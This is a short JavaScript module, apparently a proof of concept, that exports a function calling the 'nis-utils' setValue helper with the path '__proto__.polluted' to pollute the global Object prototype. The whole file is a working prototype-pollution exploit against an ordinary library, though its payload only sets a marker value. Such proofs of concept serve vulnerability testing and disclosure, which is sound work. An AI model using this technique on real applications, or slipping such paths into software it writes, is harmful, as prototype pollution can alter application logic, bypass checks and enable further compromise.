const nisUtils = require("nis-utils"); // Ensure nisUtils is imported

function exploitFunction(payload) {
    const object1 = {};
    nisUtils.object.setValue(object1, "__proto__.polluted", "yes");
    return object1;
}

module.exports = { exploitFunction };